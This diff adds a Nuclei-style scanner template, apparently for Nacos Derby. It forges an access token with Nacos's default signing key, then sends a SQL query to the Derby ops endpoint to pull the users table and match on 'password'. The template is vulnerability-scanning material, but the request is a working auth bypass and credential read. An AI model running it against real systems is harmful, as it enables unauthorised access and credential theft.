@@ -1,0 +1,39 @@
+id: poc-yaml-nacos-derby-sql-exec
+info:
+  name: Nacos Derby SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL injection vulnerability in the Nacos Derby interface by sending a crafted SQL query and analyzing the response.
+
+variables:
+  r_key: '{{hex_encode(base64_decode("SecretKey01234567890123456789012345678901234567890123456789012345678"))}}'
+  r_token: '{{generate_jwt("{\"sub\":\"nacos\"}", "HS256", hex_decode(r_key))}}'
+
+http:
+  - method: GET
+    path:
+      - "/nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20"
+    headers:
+      User-Agent: Nacos-Server
+      accessToken: '{{r_token}}'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "json"
+      - type: word
+        part: body
+        words:
+          - "\"data\""
+          - "password"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
